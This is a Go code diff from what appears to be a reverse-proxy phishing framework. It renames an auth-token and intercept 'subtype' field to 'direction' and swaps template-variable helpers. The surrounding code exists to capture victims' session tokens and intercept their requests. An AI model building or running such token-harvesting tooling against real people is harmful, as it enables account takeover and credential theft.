@@ -49,11 +49,11 @@ type BodyAuthToken struct {
 }
 
 type HttpAuthToken struct {
-	domain string
-	path   *regexp.Regexp
-	name   string
-	header string
-	subtype   string
+	domain 		string
+	path   		*regexp.Regexp
+	name   		string
+	header 		string
+	direction   string
 }
 
 type PhishletVersion struct {
@@ -124,7 +124,7 @@ type Intercept struct {
 	http_status int            `mapstructure:"http_status"`
 	body        string         `mapstructure:"body"`
 	mime        string         `mapstructure:"mime"`
-	subtype		string		   `mapstructure:"subtype"`
+	direction	string		   `mapstructure:"direction"`
 }
 
 type Phishlet struct {
@@ -184,14 +184,14 @@ type ConfigSubFilter struct {
 }
 
 type ConfigAuthToken struct {
-	Domain 	*string   `mapstructure:"domain"`
-	Keys   	*[]string `mapstructure:"keys"`
-	Type   	*string   `mapstructure:"type"`
-	Subtype	*string   `mapstructure:"subtype"`
-	Path   	*string   `mapstructure:"path"`
-	Name   	*string   `mapstructure:"name"`
-	Search 	*string   `mapstructure:"search"`
-	Header 	*string   `mapstructure:"header"`
+	Domain 		*string   `mapstructure:"domain"`
+	Keys   		*[]string `mapstructure:"keys"`
+	Type   		*string   `mapstructure:"type"`
+	Direction	*string   `mapstructure:"direction"`
+	Path   		*string   `mapstructure:"path"`
+	Name   		*string   `mapstructure:"name"`
+	Search 		*string   `mapstructure:"search"`
+	Header 		*string   `mapstructure:"header"`
 }
 
 type ConfigPostField struct {
@@ -260,7 +260,7 @@ type ConfigIntercept struct {
 	HttpStatus *int    `mapstructure:"http_status"`
 	Body       *string `mapstructure:"body"`
 	Mime       *string `mapstructure:"mime"`
-	Type	   *string `mapstructure:"type"`
+	Direction  *string `mapstructure:"direction"`
 }
 
 type ConfigPhishlet struct {
@@ -572,11 +572,11 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			if ic.Mime != nil {
 				mime = *ic.Mime
 			}
-			stype:="request"
-			if ic.Type != nil {
-				stype = *ic.Type
+			direction:="request"
+			if ic.Direction != nil {
+				direction = *ic.Direction
 			}
-			err = p.addIntercept(p.replaceTemplateVars(*ic.Domain), path_re, *ic.HttpStatus, p.replaceTemplateVars(body), mime, stype)
+			err = p.addIntercept(p.paramVal(*ic.Domain), path_re, *ic.HttpStatus, p.paramVal(body), mime, direction)
 			if err != nil {
 				return err
 			}
@@ -638,11 +638,11 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 				return fmt.Errorf("auth_tokens: 'header' not found for http auth token")
 			}
 			
-			stype:="request"
-			if at.Subtype != nil {
-				stype = *at.Subtype
+			direction:="request"
+			if at.Direction != nil {
+				direction = *at.Direction
 			}
-			err := p.addHttpAuthToken(p.replaceTemplateVars(*at.Domain), p.replaceTemplateVars(*at.Path), p.replaceTemplateVars(*at.Name), p.replaceTemplateVars(*at.Header), stype)
+			err := p.addHttpAuthToken(p.paramVal(*at.Domain), p.paramVal(*at.Path), p.paramVal(*at.Name), p.paramVal(*at.Header), direction)
 			if err != nil {
 				return err
 			}
@@ -1097,18 +1097,18 @@ func (p *Phishlet) addBodyAuthToken(hostname string, path string, name string, s
 	return nil
 }
 
-func (p *Phishlet) addHttpAuthToken(hostname string, path string, name string, header string, subtype string) error {
+func (p *Phishlet) addHttpAuthToken(hostname string, path string, name string, header string, direction string) error {
 	path_re, err := regexp.Compile(path)
 	if err != nil {
 		return err
 	}
 
 	p.httpAuthTokens[name] = &HttpAuthToken{
-		domain: hostname,
-		path:   path_re,
-		name:   name,
-		header: header,
-		subtype: 	subtype,
+		domain: 	hostname,
+		path:   	path_re,
+		name:   	name,
+		header: 	header,
+		direction: 	direction,
 	}
 
 	return nil
@@ -1139,14 +1139,14 @@ func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string,
 	return nil
 }
 
-func (p *Phishlet) addIntercept(domain string, path *regexp.Regexp, http_status int, body string, mime string, subtype string) error {
+func (p *Phishlet) addIntercept(domain string, path *regexp.Regexp, http_status int, body string, mime string, direction string) error {
 	ic := Intercept{
 		domain:      strings.ToLower(domain),
 		path:        path,
 		http_status: http_status,
 		body:        body,
 		mime:        mime,
-		subtype:	 subtype,
+		direction:	 direction,
 	}
 	p.intercept = append(p.intercept, ic)
 	return nil
